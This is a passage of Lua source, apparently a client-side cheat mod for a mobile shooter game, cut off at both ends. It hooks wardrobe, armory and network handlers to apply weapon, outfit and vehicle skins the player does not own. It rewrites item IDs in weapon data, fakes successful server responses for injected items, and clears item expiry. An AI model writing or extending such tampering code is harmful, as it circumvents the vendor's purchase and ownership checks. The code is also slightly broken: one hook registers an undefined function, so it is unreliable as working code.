    for i = 0, math.min(count - 1, 15) do
        local ok2, att = pcall(function() return arr:Get(i) end)
        if ok2 and att then
            local ok3, defRef = pcall(slua.IndexReference, att, "defineID")
            if ok3 and defRef then
                local tid = 0
                pcall(function() tid = tonumber(defRef.TypeSpecificID) or 0 end)
                if tid >= 1000000 then
                    return i, tid
                end
            end
        end
    end
    return GUN_MASTER_SYN_SLOT, 0
end

function F.resolveWeaponTypeID(weaponResID)
    weaponResID = tonumber(weaponResID) or 0
    if weaponResID <= 0 then return 0 end
    local found = 0
    pcall(function()
        local wc = CDataTable.GetTableData("WeaponConfig", weaponResID)
        if wc then found = tonumber(wc.WeaponID or wc.WeaponId or wc.weaponID or 0) end
    end)
    if found > 0 then return found end
    pcall(function()
        local ic = CDataTable.GetTableData("Item", weaponResID)
        if ic then found = tonumber(ic.WeaponID or ic.weaponId or 0) end
    end)
    return found > 0 and found or weaponResID
end

function F.findTargetSkinForWeaponRes(weaponResID)
    weaponResID = tonumber(weaponResID) or 0
    if weaponResID <= 0 then return nil end
    local cached = PERF.skinTarget[weaponResID]
    if cached ~= nil then return cached == 0 and nil or cached end

    local memSkin = F.getMatchWeaponSkin(weaponResID)
    if memSkin then return F._cacheSkinTarget(weaponResID, memSkin) end
    local typeID = F.resolveWeaponTypeID(weaponResID)
    if typeID > 0 and typeID ~= weaponResID then
        memSkin = F.getMatchWeaponSkin(typeID)
        if memSkin then return F._cacheSkinTarget(weaponResID, memSkin) end
    end

    if MATCH_CONFIG.weaponSkins and MATCH_CONFIG.weaponSkins[weaponResID] then
        local fixed = tonumber(MATCH_CONFIG.weaponSkins[weaponResID])
        if fixed and fixed > 0 then return F._cacheSkinTarget(weaponResID, fixed) end
    end

    for _, skinRes in ipairs(F.getDesiredWeaponSkins()) do
        local wid = F.weaponIdFromSkin(skinRes)
        if wid and tonumber(wid) == weaponResID then return F._cacheSkinTarget(weaponResID, skinRes) end
    end

    local typeID = F.resolveWeaponTypeID(weaponResID)
    if typeID > 0 and typeID ~= weaponResID then
        if MATCH_CONFIG.weaponSkins and MATCH_CONFIG.weaponSkins[typeID] then
            local fixed = tonumber(MATCH_CONFIG.weaponSkins[typeID])
            if fixed and fixed > 0 then return F._cacheSkinTarget(weaponResID, fixed) end
        end
        for _, skinRes in ipairs(F.getDesiredWeaponSkins()) do
            local wid = F.weaponIdFromSkin(skinRes)
            if wid and tonumber(wid) == typeID then return F._cacheSkinTarget(weaponResID, skinRes) end
        end
    end

    local avatarMatch = nil
    pcall(function()
        local AU = import("AvatarUtils")
        local weaponBase = AU.GetWeaponAvatarParentID(AU.GetBPIDByResID(weaponResID), false)
        if not weaponBase or weaponBase <= 0 then return end
        for _, skinRes in ipairs(F.getDesiredWeaponSkins()) do
            local skinBase = AU.GetWeaponAvatarParentID(AU.GetBPIDByResID(skinRes), false)
            if skinBase and skinBase > 0 and skinBase == weaponBase then
                avatarMatch = skinRes
                return
            end
        end
    end)
    if avatarMatch then return F._cacheSkinTarget(weaponResID, avatarMatch) end

    local c = F.cfg(weaponResID)
    local st = F.subType(c)
    if st and GUN_SUB[st] and MATCH_CONFIG.weaponSkins then
        for _, skinRes in pairs(MATCH_CONFIG.weaponSkins) do
            local skinWid = F.weaponIdFromSkin(skinRes)
            if skinWid then
                local sc = F.cfg(tonumber(skinWid))
                if sc and F.subType(sc) == st then return F._cacheSkinTarget(weaponResID, skinRes) end
            end
            local sc = F.cfg(skinRes)
            if sc and GUN_SUB[F.subType(sc)] and F.subType(sc) == st then return F._cacheSkinTarget(weaponResID, skinRes) end
        end
    end

    PERF.skinTarget[weaponResID] = 0
    return nil
end

function F.getSynMasterSkinID(weapon)
    if not slua.isValid(weapon) then return 0 end
    local id = 0
    pcall(function()
        local slot, tid = F.findSkinSlotInSynData(weapon)
        id = tid
        if id == 0 then
            local arr = weapon.synData
            if not arr or not slua.isValid(arr) then return end
            local att = arr:Get(GUN_MASTER_SYN_SLOT)
            if not att then return end
            id = slua.IndexReference(att, "defineID").TypeSpecificID or 0
        end
    end)
    return id
end

_G.AddOutfitSkinIdMappings = _G.AddOutfitSkinIdMappings or {}
_G.AddOutfitLastAppliedSkin = _G.AddOutfitLastAppliedSkin or {}

function F.buildSkinMappings()
    if not PERF.mappingsDirty then return end
    F.syncWeaponCacheFromLobby()
    PERF.mappingsDirty = false
    local m = _G.AddOutfitSkinIdMappings
    for k in pairs(m) do m[k] = nil end
    for wid0, w in pairs(F.cache().weapons) do
        local wid = tonumber(wid0)
        if wid and w.resID and w.resID > 0 then
            m[wid] = { tonumber(w.resID) }
        end
    end
    if MATCH_CONFIG.weaponSkins then
        for weaponKey0, skinRes in pairs(MATCH_CONFIG.weaponSkins) do
            local weaponKey = tonumber(weaponKey0)
            skinRes = tonumber(skinRes)
            if weaponKey and skinRes and skinRes > 0 and not m[weaponKey] then
                m[weaponKey] = { skinRes }
            end
        end
    end
end

function F.get_skin_id(currentGunId, maxIt)
    currentGunId = tonumber(currentGunId) or 0
    maxIt = tonumber(maxIt) or 0
    if currentGunId <= 0 and maxIt <= 0 then return 0 end
    F.buildSkinMappings()
    -- cache dari apply terakhir (paling akurat utk tas)
    if _G.AddOutfitLastAppliedSkin then
        if maxIt > 0 and _G.AddOutfitLastAppliedSkin[maxIt] then
            return tonumber(_G.AddOutfitLastAppliedSkin[maxIt]) or 0
        end
        if currentGunId > 0 and _G.AddOutfitLastAppliedSkin[currentGunId] then
            return tonumber(_G.AddOutfitLastAppliedSkin[currentGunId]) or 0
        end
    end
    if maxIt > 0 then
        local fromMem = F.getMatchWeaponSkin(maxIt)
        if fromMem then return fromMem end
    end
    local fromMem2 = F.getMatchWeaponSkin(F.resolveWeaponTypeID(currentGunId))
    if fromMem2 then return fromMem2 end
    local m = _G.AddOutfitSkinIdMappings
    if maxIt > 0 and m[maxIt] and m[maxIt][1] then return tonumber(m[maxIt][1]) end
    local list = m[currentGunId]
    if list and list[1] then return tonumber(list[1]) end
    local typeId = F.resolveWeaponTypeID(currentGunId)
    if typeId > 0 and m[typeId] and m[typeId][1] then return tonumber(m[typeId][1]) end
    local target = F.findTargetSkinForWeaponRes(maxIt > 0 and maxIt or currentGunId)
    if target then return target end
    return currentGunId
end

function F.applySkinToWeaponRef(CurWeapon)
    if not slua.isValid(CurWeapon) then return false end
    local AttachmentArray = CurWeapon.synData
    if not AttachmentArray or not slua.isValid(AttachmentArray) then return false end

    local AttachmentData = AttachmentArray:Get(GUN_MASTER_SYN_SLOT)
    if not AttachmentData then return false end

    local current_gunid = 0
    pcall(function() current_gunid = slua.IndexReference(AttachmentData, "defineID").TypeSpecificID or 0 end)
    if not current_gunid or current_gunid <= 0 then return false end

    local MaxIt = 0
    pcall(function()
        if CurWeapon.GetWeaponID then MaxIt = CurWeapon:GetWeaponID() end
        if MaxIt <= 0 then MaxIt = CurWeapon:GetItemDefineID().TypeSpecificID end
    end)
    MaxIt = tonumber(MaxIt) or 0
    local tmp_id = F.get_skin_id(current_gunid, MaxIt)
    tmp_id = tonumber(tmp_id) or 0
    if tmp_id <= 0 or MaxIt <= 0 then return false end
    
    local changedAny = false

    -- LOGIC 1: AMBIL ID GAMBAR YANG SEDANG DITAMPILKAN SECARA REAL
    local wac = CurWeapon.WeaponAvatarComponent
    local currentVisualID = 0
    if slua.isValid(wac) then currentVisualID = wac.CachedLoadedID or 0 end

    -- Selalu pastikan synData = skin (untuk icon tas), mesh hanya jika beda
    pcall(function()
        local defRef = slua.IndexReference(AttachmentData, "defineID")
        if defRef then
            local cur = tonumber(defRef.TypeSpecificID) or 0
            if cur ~= tmp_id then
                changedAny = true
                defRef.TypeSpecificID = tmp_id
                local c0 = F.cfg(tmp_id)
                if c0 and c0.ItemType and defRef.Type ~= nil then defRef.Type = c0.ItemType end
                AttachmentData.operationType = 0
                AttachmentArray:Set(GUN_MASTER_SYN_SLOT, AttachmentData)
            end
        end
    end)
    if currentVisualID ~= tmp_id then
        changedAny = true
        pcall(function()
            if CurWeapon.SetWeaponAvatarID then CurWeapon:SetWeaponAvatarID(tmp_id) end
            if CurWeapon.DelayHandleAvatarMeshChanged then CurWeapon:DelayHandleAvatarMeshChanged() end
            local wac2 = CurWeapon.WeaponAvatarComponent
            if wac2 and wac2.GetAvatarHandler then
                -- force mesh reload
            end
        end)
    end

    -- LOGIC 2: PROSES AKSESORIS (ATTACHMENTS)
    if _G.LexusConfig.SkinAttachment and tmp_id >= 1000000 and _G.VIP_Attachments and _G.VIP_Attachments[tmp_id] then
        local attachSkinConfig = _G.VIP_Attachments[tmp_id]
        local baseAttachMap = _G.BaseAttachToIndex
        
        if attachSkinConfig and baseAttachMap then
            for AttachIdx = 0, 5 do 
                pcall(function()
                    local attachData = AttachmentArray:Get(AttachIdx)
                    if attachData then
                        local defineIDRef = slua.IndexReference(attachData, "defineID")
                        if defineIDRef then
                            local attachmentId = defineIDRef.TypeSpecificID
                            if attachmentId and attachmentId > 0 then
                                local baseAttId = attachmentId
                                if baseAttId > 1000000 then
                                    local strId = tostring(baseAttId)
                                    if #strId >= 9 then baseAttId = tonumber(string.sub(strId, 2, 7)) or baseAttId end
                                end

                                local mapIndex = baseAttachMap[baseAttId]
                                if mapIndex then
                                    local targetAttachId = attachSkinConfig[mapIndex]
                                    if targetAttachId and targetAttachId > 0 and targetAttachId ~= attachmentId then
                                        defineIDRef.TypeSpecificID = targetAttachId
                                        attachData.defineID = defineIDRef
                                        AttachmentArray:Set(AttachIdx, attachData)
                                        changedAny = true
                                        
                                        -- Hapus cache Aksesoris lama agar game Load aksesoris VIP
                                        if slua.isValid(wac) then
                                            if wac.ClearMeshPathCacheBySlot then wac:ClearMeshPathCacheBySlot(AttachIdx) end
                                            if wac.ClearMeshBySlot then wac:ClearMeshBySlot(AttachIdx, true, true) end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end)
            end
        end
    end

    -- LOGIC 3: PERINTAH SAKTI PAKSA GAME RENDER ULANG MESH DI TANGAN
    if changedAny then
        pcall(function()
            if slua.isValid(wac) then
                -- Jika senjata baru diambil, hapus kulit senjata lama
                if currentVisualID ~= tmp_id then
                    if wac.ClearMeshPathCacheBySlot then wac:ClearMeshPathCacheBySlot(0) end
                    if wac.ClearMeshBySlot then wac:ClearMeshBySlot(0, true, true) end
                end
                
                if CurWeapon.DelayHandleAvatarMeshChanged then
                    CurWeapon:DelayHandleAvatarMeshChanged()
                end
                if wac.ReloadAllEquippedAvatar then
                    wac:ReloadAllEquippedAvatar(1) 
                end
            end
        end)
        _G.AddOutfitLastAppliedSkin[MaxIt] = tmp_id
        return true
    end
    
    return false
end

function _G.equip_weapon_avatar(uCharacter)
    if not uCharacter or not slua.isValid(uCharacter) then return false end
    if not (_G.LexusConfig and _G.LexusConfig.ModSkin) then return false end
    F.buildSkinMappings()
    local WeaponManager = nil
    pcall(function() WeaponManager = uCharacter:GetWeaponManager() end)
    if not WeaponManager or not slua.isValid(WeaponManager) then return false end

    local appliedAny = false
    local function tryApply(w)
        if not slua.isValid(w) then return end
        pcall(function()
            if F.applySkinToWeaponRef(w) then appliedAny = true end
        end)
        -- paksa ID skin ke senjata (icon tas / mesh)
        pcall(function()
            local baseId = 0
            if w.GetWeaponID then baseId = tonumber(w:GetWeaponID()) or 0 end
            if baseId <= 0 and w.GetItemDefineID then
                local d = w:GetItemDefineID()
                baseId = d and tonumber(d.TypeSpecificID) or 0
            end
            local skinId = 0
            if F.get_skin_id then skinId = tonumber(F.get_skin_id(0, baseId)) or 0 end
            if skinId <= 1000000 and _G.AddOutfitLastAppliedSkin and baseId > 0 then
                skinId = tonumber(_G.AddOutfitLastAppliedSkin[baseId]) or 0
            end
            if skinId > 1000000 then
                if w.SetWeaponAvatarID then w:SetWeaponAvatarID(skinId) end
                if w.synData and w.synData.Get then
                    local ad = w.synData:Get(7)
                    if ad then
                        local def = slua.IndexReference(ad, "defineID")
                        if def then
                            def.TypeSpecificID = skinId
                            w.synData:Set(7, ad)
                        end
                    end
                end
                _G.AddOutfitLastAppliedSkin = _G.AddOutfitLastAppliedSkin or {}
                if baseId > 0 then _G.AddOutfitLastAppliedSkin[baseId] = skinId end
                appliedAny = true
            end
        end)
    end

    -- list inventory
    pcall(function()
        local uWeaponList = WeaponManager:GetAllInventoryWeaponList(false)
        if uWeaponList and slua.isValid(uWeaponList) then
            for i = 0, (uWeaponList:Num() or 0) - 1 do
                tryApply(uWeaponList:Get(i))
            end
        end
    end)

    -- slot 1..5 (tas / main / side)
    pcall(function()
        for slot = 1, 5 do
            local w = nil
            if WeaponManager.GetInventoryWeaponByPropSlot then
                w = WeaponManager:GetInventoryWeaponByPropSlot(slot)
            end
            tryApply(w)
        end
    end)

    -- current
    pcall(function()
        local w = uCharacter.GetCurrentWeapon and uCharacter:GetCurrentWeapon()
        tryApply(w)
    end)

    return appliedAny
end

function F.equipWeaponAvatarSynData(char)
    return _G.equip_weapon_avatar(char)
end

F.applySkinToWeapon = F.applySkinToWeaponRef

function F.registerWeaponAvatarItems(char)
    local pc = char.GetPlayerControllerSafety and char:GetPlayerControllerSafety()
    if not slua.isValid(pc) then return false end
    local AU = import("AvatarUtils")
    local BU = import("BackpackUtils")
    local addedCount = 0

    for _, resID in ipairs(F.getDesiredWeaponSkins()) do
        local doneDirect = false
        pcall(function()
            if pc.AddWeaponAvatarItem then
                pc:AddWeaponAvatarItem(tonumber(resID))
                doneDirect = true
                addedCount = addedCount + 1
            end
        end)
        if not doneDirect then
            pcall(function()
                local skinBPID = BU.GetBPIDByResID(tonumber(resID))
                local arr = slua.Array(UEnums.EPropertyClass.Int)
                local parents = AU.GetWeaponAvatarParentIDList(skinBPID, arr, false)
                if parents and parents.Num and parents:Num() > 0 and pc.WeaponAvatarItemList then
                    for _, parentID in pairs(parents) do
                        pc.WeaponAvatarItemList:Add(parentID, skinBPID)
                    end
                    addedCount = addedCount + 1
                end
            end)
        end
    end

    if addedCount == 0 then return false end

    pcall(function() if pc.InitWeaponAvatarItems then pc:InitWeaponAvatarItems() end end)
    pcall(function() if pc.OnWeaponAvatarUpdate then pc:OnWeaponAvatarUpdate() end end)
    return true
end

function F.reloadCurrentWeaponAvatar(char)
    pcall(function()
        local weapon = char.GetCurrentWeapon and char:GetCurrentWeapon()
        if not slua.isValid(weapon) then return end
        local wac = weapon.WeaponAvatarComponent
        if slua.isValid(wac) then
            local ES = import("EWeaponAttachmentSocketType")
            pcall(function() wac:ClearMeshPathCacheBySlot(ES.MasterGun) end)
            pcall(function() wac:ClearMeshBySlot(ES.MasterGun, true, true) end)
        end
        if weapon.DelayHandleAvatarMeshChanged then
            weapon:DelayHandleAvatarMeshChanged()
        elseif slua.isValid(wac) and wac.ReloadAllEquippedAvatar then
            local ESlotDescDiff = import("ESlotDescDiff")
            wac:ReloadAllEquippedAvatar(ESlotDescDiff.MeshDiff)
        end
    end)
end

local _weaponDiagDone = false
local _weaponApplied = false
local _lastWeaponResID = 0
local _weaponSpawnHooked = false

function F.onWeaponLuaInit(_, _, weapon)
    if not weapon or not slua.isValid(weapon) then return end
    local char = F.getLocalChar()
    if not char then return end
    local owner = nil
    pcall(function()
        if weapon.GetOwnerPawn then owner = weapon:GetOwnerPawn() end
    end)
    if not slua.isValid(owner) or owner ~= char then return end
    pcall(function()
        char:AddGameTimer(0.15, false, function()
            local c = F.getLocalChar()
            if c and slua.isValid(weapon) then
                F.applySkinToWeapon(weapon)
                _weaponApplied = false
            end
        end)
    end)
end

function F.hookWeaponSpawn()
    if _weaponSpawnHooked then return end
    pcall(function()
        if EventSystem and EventSystem.registEvent and EVENTTYPE_PLAYEREVENT_WEAPON and EVENTID_PLAYEREVENT_WEAPON_LUA_INIT then
            EventSystem:registEvent(EVENTTYPE_PLAYEREVENT_WEAPON, EVENTID_PLAYEREVENT_WEAPON_LUA_INIT, onWeaponLuaInit)
            _weaponSpawnHooked = true
        end
    end)
end

function F.matchApplyWeaponSkin(char)
    if not _avatarItemsRegistered then
        _avatarItemsRegistered = F.registerWeaponAvatarItems(char)
    end

    local curWeapon = char.GetCurrentWeapon and char:GetCurrentWeapon()
    if not slua.isValid(curWeapon) then return false end

    local currentVisualID = 0
    pcall(function()
        local wac = curWeapon.WeaponAvatarComponent
        if slua.isValid(wac) then currentVisualID = wac.CachedLoadedID or 0 end
    end)

    local curWeaponResID = 0
    pcall(function() curWeaponResID = curWeapon:GetItemDefineID().TypeSpecificID end)
    local targetSkin = F.findTargetSkinForWeaponRes(curWeaponResID) or curWeaponResID

    local isVisualMatched = false
    if currentVisualID > 0 and currentVisualID == targetSkin then
        isVisualMatched = true
    end

    -- [SISTEM SMART WATCHER V3] Scan semua Senjata di tangan & di Tas
    if not _G.SmartWeaponWatcherActive then
        _G.SmartWeaponWatcherActive = true
        pcall(function()
            local ticker = require("common.time_ticker")
            if ticker and ticker.AddTimerLoop then
                ticker.AddTimerLoop(0, function()
                    if not _G.LexusConfig.ModSkin then return end
                    
                    -- [BENDERA TIDUR IN-GAME]: Jika sudah keluar Lobi -> Tidur, tidak jalankan apa-apa!
                    if _G.AddOutfit and not _G.AddOutfit.isInRealMatch() then return end
                    -- throttle: max 1 cek / 3 detik (apply tetap hanya kalau data belum VIP)
                    local _now = os.clock()
                    if _G._PUT_SmartWepLast and (_now - _G._PUT_SmartWepLast) < 3.0 then return end
                    _G._PUT_SmartWepLast = _now
                    
                    local pController = slua_GameFrontendHUD and slua_GameFrontendHUD:GetPlayerController()
                    if not pController or not slua.isValid(pController) then return end
                    local pChar = pController:GetPlayerCharacterSafety()
                    if not pChar or not slua.isValid(pChar) then return end
                    
                    -- Daripada hanya ambil senjata di tangan, ambil juga GUDANG SENJATA (Weapon Manager)
                    local WeaponManager = pChar:GetWeaponManager()
                    if not WeaponManager or not slua.isValid(WeaponManager) then return end
                    local uWeaponList = WeaponManager:GetAllInventoryWeaponList(false)
                    if not uWeaponList or not slua.isValid(uWeaponList) then return end
                    
                    local count = uWeaponList:Num()
                    -- Loop melalui semua senjata yang Anda miliki (Senjata 1, Senjata 2, Pistol, Pisau)
                    for i = 0, count - 1 do
                        local wep = uWeaponList:Get(i)
                        if slua.isValid(wep) then
                            -- Cek data (synData) senjata apakah sudah Data VIP
                            local synSkinID = F.getSynMasterSkinID(wep)
                            local baseID = 0
                            pcall(function() baseID = wep:GetItemDefineID().TypeSpecificID end)
                            local tSkin = F.findTargetSkinForWeaponRes(baseID) or baseID
                            
                            -- JIKA DATA BELUM VIP -> Baru diambil masuk Tas -> Kirim perintah Load diam-diam!
                            -- ATAU aktifkan Skin Aksesoris -> Cek aksesoris
                            if synSkinID ~= tSkin or _G.LexusConfig.SkinAttachment then
                                if _G.AddOutfit and _G.AddOutfit.applySkinToWeapon then
                                    _G.AddOutfit.applySkinToWeapon(wep)
                                end
                            end
                        end
                    end
                end, -1, 0.4) 
            end
        end)
    end

    -- LAPORAN SELESAI: Jika senjata di tangan sudah selesai, kunci aliran asli Engine
    if isVisualMatched and not _G.LexusConfig.SkinAttachment then
        _weaponApplied = true
        return true
    end

    F.buildSkinMappings()
    local okSyn = F.applySkinToWeapon(curWeapon)

    return okSyn
end

local _matchTimer = nil
local _matchWearDone = false

function F.startMatchWatcher(char)
    if _matchTimer or PERF.matchActive then return end
    PERF.matchActive = true
    local skipWear = PERF.wearDoneThisMatch
    _matchWearDone = skipWear
    _G._PUT_MatchEquipDone = false
    _avatarItemsRegistered = false
    _weaponDiagDone = false
    _weaponApplied = false
    _lastWeaponResID = 0
    local elapsed = 0

    _matchTimer = char:AddGameTimer(MATCH_TICK_SEC, true, function()
        elapsed = elapsed + MATCH_TICK_SEC
        local cur = F.getLocalChar()
        if not cur or not slua.isValid(cur) then return end

        -- Body/hat: 1x sampai sukses (anti kedut)
        if not _matchWearDone then
            _matchWearDone = F.matchApplyAllSlots(cur)
            pcall(function() F.matchApplyHat(cur) end)
            pcall(function() F.matchApplyFaceWear(cur) end)
        end
        -- Tas + Helm: tetap retry sampai ketemu item di inventory (sering belum ada di awal match)
        if not _G._PUT_MatchEquipDone then
            pcall(function()
                local bagRes = F.getDesiredWear("bagRes", "bagRes", "AddOutfitLastLobbyBagRes", F.syncBodyCacheFromLobby)
                local helmetRes = F.getDesiredWear("helmetRes", "helmetRes", "AddOutfitLastLobbyHelmetRes", F.syncBodyCacheFromLobby)
                local needB = (tonumber(bagRes) or 0) > 0
                local needH = (tonumber(helmetRes) or 0) > 0
                if not needB and not needH then
                    _G._PUT_MatchEquipDone = true
                else
                    local ok = F.matchApplyEquipmentSkin(cur, bagRes, helmetRes)
                    if ok then _G._PUT_MatchEquipDone = true end
                end
            end)
        end
        if not _weaponApplied then
            _weaponApplied = F.matchApplyWeaponSkin(cur) and true or _weaponApplied
        end
        if F.isCharacterAirborne(cur) and not _G._PUT_AirborneSkinDone then
            F.applyAirborneSlots(cur, true)
            _G._PUT_AirborneSkinDone = true
        elseif not F.isCharacterAirborne(cur) then
            _G._PUT_AirborneSkinDone = false
        end

        -- Stop setelah body+weapon siap; equip boleh lanjut sampai MATCH_MAX
        if (_matchWearDone and _weaponApplied and _G._PUT_MatchEquipDone) or elapsed >= MATCH_MAX_SEC then
            if _matchWearDone then
                PERF.wearDoneThisMatch = true
            end
            if _matchTimer and cur.RemoveGameTimer then
                pcall(function() cur:RemoveGameTimer(_matchTimer) end)
            end
            _matchTimer = nil
            PERF.matchActive = false
        end
    end)
end

function F.stopMatchWatcher()
    if _matchTimer then
        pcall(function()
            local char = F.getLocalChar()
            if char and char.RemoveGameTimer then char:RemoveGameTimer(_matchTimer) end
        end)
        _matchTimer = nil
    end
    PERF.matchActive = false
    PERF.wearDoneThisMatch = false
    _matchWearDone = false
    _avatarItemsRegistered = false
    _weaponApplied = false
    _weaponDiagDone = false
    _lastWeaponResID = 0
end

function F.hookAirborneCache()
    if _G.AddOutfitAirborneHooked then return end
    _G.AddOutfitAirborneHooked = true
    pcall(function()
        if not EventSystem or not EventSystem.registEvent then return end
        if EVENTTYPE_WARDROBE and EVENTID_WARDROBE_UPDATE_ITEM_LIST then
            EventSystem:registEvent(EVENTTYPE_WARDROBE, EVENTID_WARDROBE_UPDATE_ITEM_LIST, function()
                F.syncAirborneCacheFromLobby()
            end)
        end
    end)
end

function F.hookPutOnRsp()
    pcall(function()
        local wl = require("client.slua.logic.wardrobe.logic_wardrobe_new")
        local o = wl.on_puton_rsp
        wl.on_puton_rsp = function(self, res, item, olditem, index, extra)
            o(self, res, item, olditem, index, extra)
            if not item or not item.instid then return end
            local resID = tonumber(item.res_id)
            local insID = tonumber(item.instid)
            if not resID or not insID then return end
            local c = F.cfg(resID)
            local st = F.subType(c)
            if st == OUTFIT_SUB then
                F.saveEquip(resID, insID)
            elseif st == HAT_SUB or FACE_SUBS[st] or BODY_SUBS[st] or HELMET_SUBS[st]
                or st == PARACHUTE_SUB or F.isGlideRes(resID) or st == GLOVES_SUB then
                F.saveEquip(resID, insID)
            elseif F.isParachuteRes(resID) or F.isGlideRes(resID) then
                F.saveEquip(resID, insID)
            elseif HEAD_SUBS[st] then
                F.saveEquip(resID, insID)
            elseif GUN_SUB[st] then
                local wid = F.weaponIdFromSkin(resID)
                if wid then F.cacheWeaponSkinFromIns(wid, insID) end
            elseif st == MELEE_ID then
                F.cacheWeaponSkinFromIns(MELEE_ID, insID)
            elseif F.isInjectedIns(insID) then
                F.saveEquip(resID, insID)
            end
        end
    end)
end

function F.hookLobbyWeaponCache()
    if _G.AddOutfitLobbyWeaponCacheHooked then return end
    _G.AddOutfitLobbyWeaponCacheHooked = true
    pcall(function()
        local Arm = require("client.logic.armory.logic_armory")
        local oRsp = Arm.install_weapon_skin_rsp
        Arm.install_weapon_skin_rsp = function(client_data, errorCode, weapon_id, instanceID)
            oRsp(client_data, errorCode, weapon_id, instanceID)
            if (errorCode == 0 or errorCode == NET_OK) and F.isWeaponSkinIns(instanceID) then
                F.cacheWeaponSkinFromIns(weapon_id, instanceID)
            end
        end
        local oH = Arm.HandleWeaponSkinChange
        Arm.HandleWeaponSkinChange = function(client_data, weapon_id, instanceID)
            oH(client_data, weapon_id, instanceID)
            if F.isWeaponSkinIns(instanceID) then
                F.cacheWeaponSkinFromIns(weapon_id, instanceID)
            end
        end
    end)
    pcall(function()
        local wgl = require("client.slua.logic.wardrobe.logic_wardrobe_gun")
        local o = wgl.on_put_on_weapon_wear_rsp
        wgl.on_put_on_weapon_wear_rsp = function(self, client_data, res, weapon_id, new_skin_id, extra_weapon_list)
            o(self, client_data, res, weapon_id, new_skin_id, extra_weapon_list)
            if res == 0 or res == NET_OK then
                F.cacheWeaponSkinFromIns(weapon_id, new_skin_id)
            end
        end
    end)
    pcall(function()
        if not EventSystem or not EventSystem.registEvent then return end
        if EVENTTYPE_WARDROBE and EVENTID_WARDROBE_UPDATE_CURRENT_PUT_ON_GUN then
            EventSystem:registEvent(EVENTTYPE_WARDROBE, EVENTID_WARDROBE_UPDATE_CURRENT_PUT_ON_GUN, function(_, _, resOrFlag, weapon_id)
                weapon_id = tonumber(weapon_id)
                if weapon_id and weapon_id > 0 then
                    pcall(function()
                        local wgl = require("client.slua.logic.wardrobe.logic_wardrobe_gun")
                        local insID = tonumber(wgl:GetSkinIdByWeaponID(weapon_id)) or 0
                        if insID > 0 then F.cacheWeaponSkinFromIns(weapon_id, insID) end
                    end)
                elseif tonumber(resOrFlag) and tonumber(resOrFlag) > 100000 then
                    pcall(function()
                        local wid = F.weaponIdFromSkin(resOrFlag)
                        if wid then
                            local wd = require("client.slua.logic.wardrobe.wardrobe_data")
                            local ins = wd.GetWardrobeInsIdByResId and wd:GetWardrobeInsIdByResId(resOrFlag)
                            if ins and ins > 0 then F.cacheWeaponSkinFromIns(wid, ins) end
                        end
                    end)
                end
            end)
        end
    end)
    pcall(function()
        local WRH = require("client.network.Protocol.WardRobeHandler")
        local oHeadReq = WRH.send_depot_set_head_show_req
        WRH.send_depot_set_head_show_req = function(insID)
            insID = tonumber(insID) or 0
            if insID > 0 and F.isInjectedIns(insID) then
                local wd = require("client.slua.logic.wardrobe.wardrobe_data")
                local d = wd:GetHallDepotItemDataByInsID(insID)
                if d and d.resID then
                    F.saveEquip(tonumber(d.resID), insID)
                end
                local fbd = require("client.slua.logic.wardrobe.fashionbag.fashionbag_data")
                fbd:SetHeadShow(insID)
                WRH.on_depot_set_head_show_rsp(NET_OK, insID)
                return
            end
            return oHeadReq(insID)
        end
        local oHead = WRH.on_depot_set_head_show_rsp
        WRH.on_depot_set_head_show_rsp = function(err_code, id)
            oHead(err_code, id)
            if err_code ~= 0 and err_code ~= NET_OK then return end
            id = tonumber(id) or 0
            if id <= 0 then return end
            local wd = require("client.slua.logic.wardrobe.wardrobe_data")
            local d = wd:GetHallDepotItemDataByInsID(id)
            if d and d.resID then
                local st = tonumber(d.itemSubType or F.subType(F.cfg(d.resID)))
                if st == HAT_SUB or HELMET_SUBS[st] then
                    F.saveEquip(tonumber(d.resID), id)
                end
            end
        end
    end)
end

function F.hookWardrobePutOnReq()
    pcall(function()
        local wl = require("client.slua.logic.wardrobe.logic_wardrobe_new")
        if wl._AddOutfitPutOnReqHooked then return end
        wl._AddOutfitPutOnReqHooked = true
        local oReq = wl.wardrobe_puton_req
        wl.wardrobe_puton_req = function(self, insID, extra)
            insID = tonumber(insID)
            F.ensureDepotItemValid(insID)
            if F.tryLocalWearByIns(insID) then return end
            return oReq(self, insID, extra)
        end
        if not wl._AddOutfitPutOnDataHooked then
            wl._AddOutfitPutOnDataHooked = true
            local oData = wl.wardrobe_puton_data_req
            wl.wardrobe_puton_data_req = function(self, itemData)
                if itemData then
                    local insID = tonumber(itemData.ins_id or itemData.insID)
                    local resID = tonumber(itemData.res_id or itemData.resID)
                    F.clearItemExpire(itemData, insID, resID)
                    F.ensureDepotItemValid(insID, resID)
                end
                return oData(self, itemData)
            end
        end
    end)
end

local _bootstrapNotified = false

function F.bootstrapMatch(char)
    char = char or F.getLocalChar()
    if not char or not slua.isValid(char) then return false end
    if PERF.matchActive then return true end
    local now = os.clock()
    if (now - PERF.lastBootstrapAt) < BOOTSTRAP_COOLDOWN then return false end
    PERF.lastBootstrapAt = now
    F.syncWeaponCacheFromLobby(true)
    F.applyPersistSlotsToCache()
    F.cleanArmoryPollution()
    F.syncGlobalWearSkins()
    F.syncAirborneToDataMgr()
    pcall(function() F.applyAirborneSlots(char, F.isCharacterAirborne(char)) end)
    F.syncVehicleCacheFromDataMgr()
    F.syncVehicleSlotsToDataMgr()
    pcall(function() F.applyVehicleSkinsToPC(F.getPC()) end)
    F.startVehicleSkinTicker()
    pcall(function()
        local v = F.getMatchVehicle()
        if slua.isValid(v) then F.autoApplyVehicleSkinOnEnter(v) end
    end)
    _weaponApplied = false
    _weaponDiagDone = false
    _matchApplied = false
    if not _bootstrapNotified then
        _bootstrapNotified = true
    end
    F.startMatchWatcher(char)
    return true
end

function F.hookMatchAvatar()
    pcall(function()
        local CAC = require("GameLua.Mod.Library.GamePlay.Avatar.Component.CharacterAvatarComponent")
        local o = CAC.OnAvatarAllMeshLoadedLua
        CAC.OnAvatarAllMeshLoadedLua = function(self)
            o(self)
            pcall(function()
                if self.IsLobbyActor and self:IsLobbyActor() then return end
                local isSelf = self.IsSelf and self:IsSelf()
                if not isSelf then return end
                if PERF.wearDoneThisMatch or PERF.matchActive then return end
                local char = F.getLocalChar()
                if char and char.AddGameTimer then
                    char:AddGameTimer(0.5, false, function() F.bootstrapMatch(char) end)
                end
            end)
        end
    end)
    pcall(function()
        local WAC = require("GameLua.Mod.Library.GamePlay.Avatar.Component.WeaponAvatarComponent")
        local oLoad = WAC.OnWeaponAvatarLoadedLua
        WAC.OnWeaponAvatarLoadedLua = function(self, slotID, definedID)
            oLoad(self, slotID, definedID)
